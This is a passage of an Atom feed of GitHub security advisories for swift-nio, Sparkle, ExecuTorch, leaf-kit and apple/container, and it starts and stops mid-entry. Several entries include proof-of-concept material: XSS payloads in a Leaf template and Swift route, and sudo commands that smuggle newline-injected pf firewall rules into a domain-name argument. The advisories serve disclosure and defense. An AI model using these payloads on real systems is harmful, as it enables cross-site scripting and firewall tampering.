        <updated>2026-06-12T15:07:02.000Z</updated>
        <content type="html"><![CDATA[<p>Programs using swift-nio is vulnerable to HTTP request smuggling and HTTP response splitting attacks, caused by insufficient validation of outbound HTTP/1.1 request and response start line components.</p>
<p>This vulnerability affects all swift-nio versions from 2.0.0 to 2.99.0. It is fixed in 2.100.0 and later releases.                                                                                         </p>
<p>This vulnerability is caused by the <code>NIOHTTPRequestHeadersValidator</code> and <code>NIOHTTPResponseHeadersValidator</code> channel handlers only validating header field names and values, while leaving the request URI, request method, and response reason phrase unvalidated. An attacker who can influence the content of these fields — for example by controlling a URL path or a custom HTTP method in a proxy application — can inject CR/LF sequences or other control characters into the HTTP start line. This allows construction of arbitrary additional HTTP requests or responses on the wire, a classic HTTP request smuggling or HTTP response splitting attack.</p>
<p>Exploiting this vulnerability requires the attacker to influence the content of outbound HTTP start line fields. In proxy applications that forward attacker-controlled URIs or methods, this is straightforward. For clients, a malicious server that triggers a redirect to a crafted URL could exploit the URI validation gap. For servers, any client that can cause the server to emit a crafted response reason phrase could exploit the response splitting gap.                                                                                                                                          </p>
<p>In vulnerable applications, where attacker controlled data is supplied to these fields, the attack is low-effort: injecting a CRLF sequence into a URI or reason phrase requires only a single crafted request. Successful exploitation can allow an attacker to smuggle additional HTTP requests past intermediaries or split HTTP responses, potentially bypassing WAFs or poisoning web caches. However, most applications are not vulnerable at all.</p>
<p>The risk can be mitigated by ensuring that all user-controlled input is sanitized before being used in HTTP start line components. However, this mitigation places the burden on application developers and is error-prone.</p>
<p>The issue is fixed by extending <code>NIOHTTPRequestHeadersValidator</code> to validate request URIs against the character set defined in RFC 9112 Section 3.2 and RFC 3986 Section 3, and to validate custom HTTP methods against the token grammar defined in RFC 9110. <code>NIOHTTPResponseHeadersValidator</code> is extended to validate custom response reason phrases against RFC 9112 Section 4. Applications that use these validator channel handlers — which are installed by default when using <code>addHTTPClientHandlers()</code> or <code>addHTTPServerHandlers()</code> — will reject invalid outbound messages with an HTTPParserError.invalidHeaderToken error rather than emitting them to the network.</p>
<p>SwiftNIO is grateful to @kuranikaran and @YLChen-007 for their reporting and assistance with the project's process.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-nio/security/advisories/GHSA-cq87-8r7h-962v">https://github.com/apple/swift-nio/security/advisories/GHSA-cq87-8r7h-962v</a></li>
<li><a href="https://github.com/advisories/GHSA-cq87-8r7h-962v">https://github.com/advisories/GHSA-cq87-8r7h-962v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq87-8r7h-962v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-12T15:07:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/sparkle-project/Sparkle] Sparkle's AppInstaller post-stage-1 XPC listener accepts unvalidated connections, allowing spoofed appcast item data injection]]></title>
        <id>https://github.com/advisories/GHSA-g3hp-f6mg-559v</id>
        <link href="https://github.com/advisories/GHSA-g3hp-f6mg-559v"/>
        <updated>2026-05-29T19:47:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>AppInstaller post-stage-1 XPC listener accepts unvalidated connections, allowing spoofed appcast item data injection.</p>
<h2 id="details">Details</h2>
<p><code>Autoupdate/AppInstaller.m</code>'s <code>shouldAcceptNewConnection:</code> only enforces <code>SUCodeSigningVerifier validateConnection:</code> before stage 1 completes. After <code>_performedStage1Installation = YES</code>, new connections to the registered Mach service <code>&lt;bundleId&gt;-spki</code> are accepted from any local process without team-ID or code-signing checks.</p>
<p>The following chain of events enables an attacker to inject a spoofed <code>SPUSentUpdateAppcastItemData</code> payload:</p>
<ol>
<li>Installer finishes unarchiving the update successfully (<code>_willCompleteInstallation</code> is set).</li>
<li>The app responsible for updating the bundle crashes or is forcefully quit before it has a chance to send <code>SPUSentUpdateAppcastItemData</code> to the installer. There is no user interaction between the prior step and this one, so the timing window is tight.</li>
<li>After stage 1 of the installer is performed (<code>_performedStage1Installation = YES</code>), but before final installation completes (since all services are cleaned up by then), an attacker process connects to the <code>&lt;bundleId&gt;-spki</code> Mach service - no code-signing validation is enforced - and sends a spoofed <code>SPUSentUpdateAppcastItemData</code> message containing an attacker-crafted <code>SUAppcastItem</code>.</li>
<li>A Sparkle-aware app that checks for updates on the bundle being updated launches before installation completes. The progress agent re-broadcasts the spoofed <code>SUAppcastItem</code> on its <code>&lt;bundleId&gt;-spks</code> status service, and the launching app displays attacker-controlled release notes (name, version, critical flag).</li>
</ol>
<p>Note: Sparkle can be used to update other app bundles, so the "app doing the updating" and the "app being updated" are not necessarily the same bundle.</p>
<p>In the system-domain case (<code>SPUUsesSystemDomainForBundlePath = true</code>), the AppInstaller runs as root via <code>SMJobSubmit</code> to <code>kSMDomainSystemLaunchd</code>, and the Mach service is reachable by any local user process.</p>
<p>Affected versions: 2.x branch including 2.9.1.</p>
<h2 id="impact">Impact</h2>
<p>A local user-level process can inject a forged <code>SUAppcastItem</code> (arbitrary name, version, critical flag) into the progress agent's status broadcast. Other Sparkle-aware clients on the system will display attacker-controlled release notes as authoritative installation state.</p>
<p>The integrity of the installed code is <strong>not</strong> affected - the bundle moved into place is the legitimate, signature-validated update from stage 1. The impact is limited to UI spoofing of installation metadata.</p>
<h2 id="remediation">Remediation</h2>
<p>Enforce <code>SUCodeSigningVerifier validateConnection:</code> on all new connections regardless of installation stage, or disallow <code>SPUSentUpdateAppcastItemData</code> after the active connection invalidates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparkle-project/Sparkle/security/advisories/GHSA-g3hp-f6mg-559v">https://github.com/sparkle-project/Sparkle/security/advisories/GHSA-g3hp-f6mg-559v</a></li>
<li><a href="https://github.com/advisories/GHSA-g3hp-f6mg-559v">https://github.com/advisories/GHSA-g3hp-f6mg-559v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g3hp-f6mg-559v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T19:47:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pytorch/executorch] ExecuTorch vulnerable to Heap-based Buffer Overflow]]></title>
        <id>https://github.com/advisories/GHSA-xc7w-r669-48pf</id>
        <link href="https://github.com/advisories/GHSA-xc7w-r669-48pf"/>
        <updated>2026-08-21T03:22:16.000Z</updated>
        <content type="html"><![CDATA[<p>A group of related buffer overflow vulnerabilities in the loading of ExecuTorch models can cause the runtime to crash and potentially result in code execution or other undesirable effects. This issue affects ExecuTorch prior to commit cea9b23aa8ff78aff92829a466da97461cc7930c.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54951">https://nvd.nist.gov/vuln/detail/CVE-2025-54951</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/cea9b23aa8ff78aff92829a466da97461cc7930c">https://github.com/pytorch/executorch/commit/cea9b23aa8ff78aff92829a466da97461cc7930c</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-54951">https://www.facebook.com/security/advisories/cve-2025-54951</a></li>
<li><a href="https://github.com/advisories/GHSA-xc7w-r669-48pf">https://github.com/advisories/GHSA-xc7w-r669-48pf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xc7w-r669-48pf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-08-08T00:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pytorch/executorch] ExecuTorch integer overflow vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hj95-mhgf-jxc4</id>
        <link href="https://github.com/advisories/GHSA-hj95-mhgf-jxc4"/>
        <updated>2026-08-21T03:22:16.000Z</updated>
        <content type="html"><![CDATA[<p>An integer overflow vulnerability in the loading of ExecuTorch models can cause overlapping allocations, potentially resulting in code execution or other undesirable effects. This issue affects ExecuTorch prior to commit d158236b1dc84539c1b16843bc74054c9dcba006.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30404">https://nvd.nist.gov/vuln/detail/CVE-2025-30404</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/d158236b1dc84539c1b16843bc74054c9dcba006">https://github.com/pytorch/executorch/commit/d158236b1dc84539c1b16843bc74054c9dcba006</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-30404">https://www.facebook.com/security/advisories/cve-2025-30404</a></li>
<li><a href="https://github.com/advisories/GHSA-hj95-mhgf-jxc4">https://github.com/advisories/GHSA-hj95-mhgf-jxc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj95-mhgf-jxc4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-08-08T00:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pytorch/executorch] ExecuTorch vulnerable to Heap-based Buffer Overflow attack]]></title>
        <id>https://github.com/advisories/GHSA-h952-963h-rv99</id>
        <link href="https://github.com/advisories/GHSA-h952-963h-rv99"/>
        <updated>2026-08-21T03:22:17.000Z</updated>
        <content type="html"><![CDATA[<p>A heap-buffer-overflow vulnerability in the loading of ExecuTorch methods can cause the runtime to crash and potentially result in code execution or other undesirable effects. This issue affects ExecuTorch prior to commit 93b1a0c15f7eda49b2bc46b5b4c49557b4e9810f</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30402">https://nvd.nist.gov/vuln/detail/CVE-2025-30402</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/93b1a0c15f7eda49b2bc46b5b4c49557b4e9810f">https://github.com/pytorch/executorch/commit/93b1a0c15f7eda49b2bc46b5b4c49557b4e9810f</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-30402">https://www.facebook.com/security/advisories/cve-2025-30402</a></li>
<li><a href="https://github.com/advisories/GHSA-h952-963h-rv99">https://github.com/advisories/GHSA-h952-963h-rv99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h952-963h-rv99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-07-11T18:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pytorch/executorch] ExecuTorch out-of-bounds access vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f9hx-c6jf-3qxm</id>
        <link href="https://github.com/advisories/GHSA-f9hx-c6jf-3qxm"/>
        <updated>2026-08-21T03:22:16.000Z</updated>
        <content type="html"><![CDATA[<p>An out-of-bounds access vulnerability in the loading of ExecuTorch models can cause the runtime to crash and potentially result in code execution or other undesirable effects. This issue affects ExecuTorch prior to commit fb03b6f85596a8f954d97929075335255b6a58d4.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54950">https://nvd.nist.gov/vuln/detail/CVE-2025-54950</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/fb03b6f85596a8f954d97929075335255b6a58d4">https://github.com/pytorch/executorch/commit/fb03b6f85596a8f954d97929075335255b6a58d4</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-54950">https://www.facebook.com/security/advisories/cve-2025-54950</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/b6b7a16df5e7852d976d8c34c8a7e9a1b6f7d005">https://github.com/pytorch/executorch/commit/b6b7a16df5e7852d976d8c34c8a7e9a1b6f7d005</a></li>
<li><a href="https://github.com/advisories/GHSA-f9hx-c6jf-3qxm">https://github.com/advisories/GHSA-f9hx-c6jf-3qxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f9hx-c6jf-3qxm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-08-08T00:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pytorch/executorch] ExecuTorch heap buffer overflow vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9m39-3mf3-xwch</id>
        <link href="https://github.com/advisories/GHSA-9m39-3mf3-xwch"/>
        <updated>2026-08-21T03:22:16.000Z</updated>
        <content type="html"><![CDATA[<p>A heap buffer overflow vulnerability in the loading of ExecuTorch models can potentially result in code execution or other undesirable effects. This issue affects ExecuTorch prior to commit ede82493dae6d2d43f8c424e7be4721abe5242be</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54949">https://nvd.nist.gov/vuln/detail/CVE-2025-54949</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/ede82493dae6d2d43f8c424e7be4721abe5242be">https://github.com/pytorch/executorch/commit/ede82493dae6d2d43f8c424e7be4721abe5242be</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-54949">https://www.facebook.com/security/advisories/cve-2025-54949</a></li>
<li><a href="https://github.com/advisories/GHSA-9m39-3mf3-xwch">https://github.com/advisories/GHSA-9m39-3mf3-xwch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9m39-3mf3-xwch</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-08-08T00:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pytorch/executorch] ExecuTorch integer overflow vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-84m3-f99p-cqx5</id>
        <link href="https://github.com/advisories/GHSA-84m3-f99p-cqx5"/>
        <updated>2026-08-21T03:22:16.000Z</updated>
        <content type="html"><![CDATA[<p>An integer overflow vulnerability in the loading of ExecuTorch models can cause objects to be placed outside their allocated memory area, potentially resulting in code execution or other undesirable effects. This issue affects ExecuTorch prior to commit 0830af8207240df8d7f35b984cdf8bc35d74fa73.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30405">https://nvd.nist.gov/vuln/detail/CVE-2025-30405</a></li>
<li><a href="https://github.com/pytorch/executorch/commit/0830af8207240df8d7f35b984cdf8bc35d74fa73">https://github.com/pytorch/executorch/commit/0830af8207240df8d7f35b984cdf8bc35d74fa73</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-30405">https://www.facebook.com/security/advisories/cve-2025-30405</a></li>
<li><a href="https://github.com/advisories/GHSA-84m3-f99p-cqx5">https://github.com/advisories/GHSA-84m3-f99p-cqx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-84m3-f99p-cqx5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-08-08T00:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/vapor/leaf-kit] LeafKit's HTML escaping may be skipped for Collection values, enabling XSS]]></title>
        <id>https://github.com/advisories/GHSA-6jj5-j4j8-8473</id>
        <link href="https://github.com/advisories/GHSA-6jj5-j4j8-8473"/>
        <updated>2026-05-07T13:24:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>LeafKit HTML-escaping is not working correctly when a template prints a collection (Array / Dictionary) via <code>#(value)</code>. This can result in XSS, allowing potentially untrusted input to be rendered unescaped.</p>
<h3 id="details">Details</h3>
<p>LeafKit attempts to escape expressions during serialization, but due to <a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L322"><code>LeafData.htmlEscaped()</code></a>'s implementation, when the escaped type's conversion to <code>String</code> is marked as <code>.ambiguous</code> (as it is the case for Arrays and Dictionaries), an unescaped <code>self</code> is returned.</p>
<blockquote>
<p><strong>Note: I recommend first looking at the POC, before taking a look at the details below, as it is simple.</strong> In the detailed, verbose analysis below, I explored the functions involved in more detail, in hopes that it will help you understand and locate this issue.</p>
</blockquote>
<h4 id="the-issues-detailed-analysis">The issue's detailed analysis:</h4>
<ol>
<li>Leaf expression serialization eventually reaches <code>LeafSerializer</code>'s <code>serialize</code> private function below.  This is where the <code>leafData</code> is <code>.htmlEscaped()</code>, and then serialized.</li>
</ol>
<p><a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafSerialize/LeafSerializer.swift#L60-L66">https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafSerialize/LeafSerializer.swift#L60-L66</a></p>
<ol start="2">
<li>The <code>LeafData.htmlEscaped()</code> method uses the <code>LeafData.string</code> computed property to convert itself to a string. Then, it calls the <code>htmlEscaped()</code> method on it. However, if the string conversion fails, notice that an unescaped, unsafe <code>self</code> is returned (line 324 below):</li>
</ol>
<p><a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L321-L328">https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L321-L328</a></p>
<ol start="3">
<li>Regarding why <code>.string</code> may return nil, if the escaped value is not a string already, a convesion is attempted, which may fail.</li>
</ol>
<p><a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L211-L216">https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L211-L216</a></p>
<p>In this specific case, the conversion fails at line 303 below, when <code>conversion.is &gt;= level</code> is checked. The check fails because <a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L525-L535"><code>.array</code> and <code>.dictionary</code> conversions to <code>.string</code> are deemed <code>.ambiguous</code></a>. If we forcefully allow ambiguous conversions, the vulnerability disappears, as the conversion is successful.</p>
<p><a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L295-L319">https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafData.swift#L295-L319</a></p>
<ol start="5">
<li>Coming back to <code>LeafSerializer</code>'s <code>serialize</code> private method, we are now interested in finding out what happens after <code>LeafData.htmlEscaped()</code> returns self. Recall from <code>1.</code> that the output was then <code>.serialized()</code>. Thus, the unescaped <code>LeafData</code> follows the normal serialization path, as if it were HTML-escaped. More specifically, serialization is done <a href="https://github.com/vapor/leaf-kit/blob/8ff06839d8b3ddf74032d2ade01e3453eb556d30/Sources/LeafKit/LeafData/LeafDataStorage.swift#L52-L63">here</a>, where <code>.map</code> / <code>.mapValues</code> is called, unsafely serializing each element of the dictionary.</li>
</ol>
<h3 id="poc">PoC</h3>


<p>In a new Vapor project created with <code>vapor new poc -n --leaf</code>, use a simple leaf template like the following:</p>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;
    &lt;body&gt;
    &lt;h1&gt;#(username)&lt;/h1&gt;
      &lt;h2&gt;someDict:&lt;/h2&gt;
      &lt;p&gt;#(someDict)&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>And the following <code>routes.swift</code>:</p>
<pre><code class="language-swift">import Vapor

struct User: Encodable {
    var username: String
    var someDict: [String: String]
}

func routes(_ app: Application) throws {
    app.get { req async throws in
        try await req.view.render("index", User(
            username: "Escaped XSS - &lt;img src=x onerror=alert(1)&gt;",
            someDict: ["&lt;img src=x onerror=alert(1337)&gt;":"&lt;img src=x onerror=alert(31337)&gt;"]
        ))
    }
}
</code></pre>
<p>By running and accessing the server in a browser, XSS should be triggered twice (with <code>alert(1337)</code> and <code>alert(31337)</code>). <code>var someDict: [String: String]</code> could also be replaced with an array / dictionary of a different type, such as another <code>Encodable</code> stuct.</p>
<p>Also note that, in a real concerning scenario, the array / dictionary would contain (i.e. reflect) data inputted by the user.</p>
<h3 id="impact">Impact</h3>
<p>This is a cross-site scripting (XSS) vulnerability in rendered Leaf templates. Vapor/Leaf applications that render user-controlled data inside arrays or dictionaries using <code>#(value)</code> may be impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vapor/leaf-kit/security/advisories/GHSA-6jj5-j4j8-8473">https://github.com/vapor/leaf-kit/security/advisories/GHSA-6jj5-j4j8-8473</a></li>
<li><a href="https://github.com/vapor/leaf-kit/commit/6044b844caa858a0c5f2505ac166f5a057c990dc">https://github.com/vapor/leaf-kit/commit/6044b844caa858a0c5f2505ac166f5a057c990dc</a></li>
<li><a href="https://github.com/vapor/leaf-kit/releases/tag/1.14.2">https://github.com/vapor/leaf-kit/releases/tag/1.14.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28499">https://nvd.nist.gov/vuln/detail/CVE-2026-28499</a></li>
<li><a href="https://github.com/advisories/GHSA-6jj5-j4j8-8473">https://github.com/advisories/GHSA-6jj5-j4j8-8473</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6jj5-j4j8-8473</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-16T16:22:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apple/container] container: pf Rule Injection via Domain Name Argument in `container system dns create --localhost` Command]]></title>
        <id>https://github.com/advisories/GHSA-39g5-644c-qwcg</id>
        <link href="https://github.com/advisories/GHSA-39g5-644c-qwcg"/>
        <updated>2026-07-16T04:24:18.000Z</updated>
        <content type="html"><![CDATA[<h4 id="product">Product</h4>
<p>Name: container</p>
<p>Github Link: <a href="https://github.com/apple/container">https://github.com/apple/container</a></p>
<p>Version: &lt;= 0.12.2</p>
<h4 id="summary">Summary</h4>
<p>The <code>container system dns create --localhost</code> command accepts a <code>domainName</code> argument and passes it unsanitized into the pf anchor file (<code>/etc/pf.anchors/com.apple.container</code>) as a comment in a rule line. A domain name containing a newline character breaks out of the comment context and injects an arbitrary pf rule into the anchor file. When <code>pfctl -f</code> subsequently loads the configuration, the attacker-controlled rule is loaded into the macOS kernel packet filter.</p>
<p>A <code>isValidDomainName()</code> function exists in <code>Parser.swift:892</code> but is <strong>never called</strong> from <code>DNSCreate</code>.</p>
<p><strong>The core harm caused by this vulnerability is the bypassing of sudo privileges. An administrator may have only granted a user or an automation tool such as CI/CD the ability to execute <code>container system dns create</code> with root privileges, expecting that the user or automation tool could only add redirects from other IPs to localhost in the firewall rules file via <code>--localhost</code>. However, an attacker can exploit this vulnerability to write arbitrary rules into the firewall rules file: the target address is no longer restricted to localhost, and the rules are no longer limited to redirects.</strong></p>
<h4 id="impact">Impact</h4>
<p><strong>What a legitimate invocation can write</strong></p>
<p><code>--localhost</code> is an optional parameter. Its presence or absence determines whether any pf rule is written at all:</p>
<ul>
<li><strong>Without <code>--localhost</code></strong>: only a resolver config file is written; no pf rule is produced.</li>
<li><strong>With <code>--localhost &lt;IP&gt;</code></strong>: exactly one rule is written to the pf anchor file:</li>
</ul>
<pre><code>rdr inet from any to &lt;IP&gt; -&gt; 127.0.0.1 # &lt;domain&gt;
</code></pre>
<p>The redirect destination is hard-coded to <code>127.0.0.1</code>. The rule type is always <code>rdr inet</code>. There is no legitimate way to produce a rule that redirects traffic to any IP other than <code>127.0.0.1</code>, nor to produce <code>pass</code>, <code>block</code>, or <code>nat</code> rules, through normal command usage.</p>
<p><strong>What injection additionally enables</strong></p>
<p>The injection lives in the domain name argument. <code>--localhost</code> must be supplied to trigger the <code>createRedirectRule()</code> code path — without it, no pf rule is written at all and the domain name never reaches the pf anchor file. However, the value passed to <code>--localhost</code> is unconstrained (only IP format is validated), so any valid IP suffices to open the injection path.</p>
<pre><code class="language-bash">sudo container system dns create --localhost 127.0.0.1 \
  $'foo.local\nrdr inet from any to 1.2.3.4 -&gt; 5.6.7.8'
</code></pre>
<p>The <code>--localhost</code> value becomes the <code>from</code> IP in the legitimate rule. The injected content after the newline is an entirely independent pf directive with fully attacker-controlled <code>from</code> and <code>to</code> values.</p>
<p>The capability gap between normal use and injection is therefore:</p>
<table>
<thead>
<tr>
<th></th>
<th>Normal use (no <code>--localhost</code>)</th>
<th>Normal use (with <code>--localhost</code>)</th>
<th>Injection (with <code>--localhost</code>, domain contains <code>\n</code>)</th>
</tr>
</thead>
<tbody><tr>
<td>Writes pf rule</td>
<td>No</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><code>from</code> IP</td>
<td>—</td>
<td>User-specified</td>
<td>Arbitrary</td>
</tr>
<tr>
<td><code>to</code> IP</td>
<td>—</td>
<td>Hard-coded <code>127.0.0.1</code></td>
<td><strong>Arbitrary</strong></td>
</tr>
<tr>
<td>Rule type</td>
<td>—</td>
<td><code>rdr inet</code> only</td>
<td>Any (<code>pass</code>, <code>block</code>, <code>nat</code>, …)</td>
</tr>
</tbody></table>
<p>The single capability that injection uniquely adds is: <strong>writing a pf rule with an arbitrary <code>to</code> IP</strong> — redirecting traffic to any external host rather than being confined to <code>127.0.0.1</code>.</p>
<p><strong>Primary scenario: sudo delegation bypass</strong></p>
<p>The most direct attack path requires only that an administrator grants a restricted user sudo access to this specific command:</p>
<pre><code># /etc/sudoers
user ALL=(root) NOPASSWD: /usr/bin/container system dns create *
</code></pre>
<p>The administrator's intent is to allow <code>user</code> to manage DNS domains for container networking. Under normal usage this is bounded: even with <code>--localhost</code>, the command can only produce <code>rdr ... -&gt; 127.0.0.1</code> rules. Without <code>--localhost</code>, it produces no pf rules at all.</p>
<p>With the injection, the user provides any valid IP to <code>--localhost</code> to open the pf write path, then embeds the actual malicious rule in the domain name:</p>
<pre><code class="language-bash">sudo container system dns create --localhost 127.0.0.1 \
  $'evil.local\nrdr inet proto tcp from any to 10.0.0.1 -&gt; 203.0.113.1 port 4444'
</code></pre>
<p>This is a classic sudo delegation bypass: the administrator delegated a scoped capability; the injection expands it to writing arbitrary kernel firewall rules.</p>
<p><strong>Additional scenarios:</strong></p>
<ul>
<li>An automated script or CI/CD pipeline that runs <code>sudo container system dns create $DOMAIN_FROM_ENV</code> where the environment variable originates from a container label, image metadata, or external API response — any newline in the upstream value triggers injection without any user action</li>
<li>A developer following documentation or a README that includes a crafted domain name example (social engineering)</li>
</ul>
<p><strong>Consequences of successful injection:</strong></p>
<ul>
<li>pf redirect rules with arbitrary <code>from</code> and <code>to</code> IPs — enabling redirection of any host-level traffic to an attacker-controlled external address (not achievable through normal command use)</li>
<li>Additional rule types (<code>pass</code>, <code>block</code>, <code>nat</code>) with arbitrary port and protocol filters loaded into the kernel</li>
<li>Legitimate traffic selectively blocked (denial of service against specific endpoints)</li>
<li>Injected rules persist across DNS domain deletions — the <code>removeRedirectRule()</code> cleanup path cannot match and remove standalone injected lines</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was independently discovered and reported by multiple sources:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
<li>Mohamed Abdelaal (@0xmrma)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/container/security/advisories/GHSA-39g5-644c-qwcg">https://github.com/apple/container/security/advisories/GHSA-39g5-644c-qwcg</a></li>
<li><a href="https://github.com/advisories/GHSA-39g5-644c-qwcg">https://github.com/advisories/GHSA-39g5-644c-qwcg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39g5-644c-qwcg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-07T01:43:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/vapor/leaf-kit] Leaf-kit html escaping does not work on characters that are part of extended grapheme cluster]]></title>
        <id>https://github.com/advisories/GHSA-4hfh-fch3-5q7p</id>
        <link href="https://github.com/advisories/GHSA-4hfh-fch3-5q7p"/>
        <updated>2026-04-22T16:24:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>htmlEscaped</code> in leaf-kit will only escape html  special characters if the extended grapheme clusters match, which allows bypassing escaping by using an extended grapheme cluster containing both the special html character and some additional characters. In the case of html attributes, this can lead to XSS if there is a leaf variable in the attribute that is user controlled.</p>
<h3 id="details">Details</h3>
<p>Relevant code:
<a href="https://github.com/vapor/leaf-kit/blob/main/Sources/LeafKit/String%2BHTMLEscape.swift#L14">https://github.com/vapor/leaf-kit/blob/main/Sources/LeafKit/String%2BHTMLEscape.swift#L14</a></p>
<p>Strings in Swift are based on extended grapheme clusters. HTML on the other hand is based on unicode characters. </p>
<p>For example if you have the sequence "́  (U+0022 Quotation mark followed by U+0301 Combining Acute Accent). To HTML this is just a quote mark followed by some other random character. To swift this is one extended grapheme cluster that does not equal a quotation mark by itself which is a different extended grapheme cluster.</p>
<p>Thus <code>"\"́".replacingOccurrences(of: "\"", with: "&amp;quot;")</code> does not replace the quote mark. This allows you to break out of html attributes.</p>
